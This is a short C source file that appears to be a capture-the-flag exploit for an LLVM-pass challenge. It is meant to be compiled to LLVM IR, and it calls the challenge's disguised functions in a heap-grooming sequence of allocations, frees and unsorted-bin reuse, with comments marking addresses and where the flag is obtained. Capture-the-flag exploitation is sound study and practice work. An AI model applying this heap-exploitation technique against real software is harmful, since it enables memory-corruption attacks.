//clang -emit-llvm -S exp.c -o exp.ll
void wher3(int a);
void wr1te(int a, int b);
void re4d(int a);
void p4int(int a);
void g1ft();
void c1ear();
void m41n(int a)
{
   int a1 = 0x20 + 0x18; // 0
   int a2 = 0x0;         // 1
   int a3 = 0x0;         // 2
   wher3(0x48);
   wher3(0x48);
   wher3(0x48);
   wher3(0x48);
   wher3(0x48);
   wher3(0x48);
   wher3(0x88); // run out 0x50 0x90

   wher3(0x88); // unsorted bin

   wher3(0x88); // unsorted bin
   c1ear();     // 0x80cc10
   wher3(0x48); // unsorted bin
   c1ear();     // 0x80cca0
   p4int(40);

   g1ft();
   wher3(0x88); // get flag here 0x80cc10
   p4int(40);

   if (a == 4)
   {
      wher3(0x78); // freed ins; buf.Parent = 0x80cca0
   }

   wr1te(0x50, 0);
   re4d(0x58); // 3
   re4d(0x59); // 4
   wr1te(0x51, 4);
   re4d(0x5a); // 5
   wr1te(0x52, 5);
   re4d(0x5b); // 6
   wr1te(0x53, 6);
   re4d(0x5c); // 7
   wr1te(0x54, 7);
   re4d(0x5d); // 8
   wr1te(0x55, 8);
   re4d(0x5e); // 9
   wr1te(0x56, 9);

   p4int(40);
   return;
}
int main()
{
   int a;
}
